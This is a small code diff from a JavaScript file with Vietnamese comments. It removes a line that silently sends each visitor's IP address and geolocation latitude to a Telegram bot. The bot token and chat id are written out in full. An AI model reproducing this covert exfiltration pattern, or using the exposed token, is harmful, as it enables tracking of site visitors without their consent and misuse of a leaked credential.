@@ -124,7 +124,7 @@
   .then(response => response.json())
   .then(data => {
     console.log(data.ip); // Địa chỉ IP
-    fetch('https://api.telegram.org/bot6769553327:AAEwKifUmAx2hUgodRudzpIjcCfEnDZ1e6s/sendMessage?chat_id=6142403832&text=ACCESS! IP:'+data.ip+'\n Country: '+position.coords.latitude+'')
+    
   })
   .catch(error => {
     console.error('Đã có lỗi xảy ra:', error);
